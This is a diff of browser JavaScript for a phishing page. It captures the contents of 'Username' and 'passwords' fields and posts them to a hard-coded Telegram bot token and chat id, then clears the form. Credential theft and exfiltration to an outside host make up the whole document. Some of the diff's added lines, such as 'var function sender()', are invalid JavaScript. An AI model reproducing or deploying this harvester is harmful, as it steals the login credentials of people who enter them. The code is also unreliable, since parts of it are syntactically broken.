@@ -1,15 +1,12 @@
-//bot token
 var telegram_bot_id = "5618597143:AAE2j2MEiYfwFy-80ELc7bo039cuzhXEvDg";
-//chat id
 var chat_id = 5361641680;
 var Username, passwords, message;
-var ready = function () {
+var  function ready() {
     Username = document.getElementById("Username").value;
     passwords = document.getElementById("passwords").value;
-    message = document.getElementById("message").value;
-    message = "Username: " + Username + "\passwords: " + passwords + "\nMessage: " + message;
+    message = "Username: " + Username + "\passwords: " + passwords ;
 };
-var sender = function () {
+var function sender() {
     ready();
     var settings = {
         "async": true,
@@ -30,6 +27,5 @@ var sender = function () {
     });
     document.getElementById("Username").value = "";
     document.getElementById("passwords").value = "";
-    document.getElementById("message").value = "";
     return false;
 };
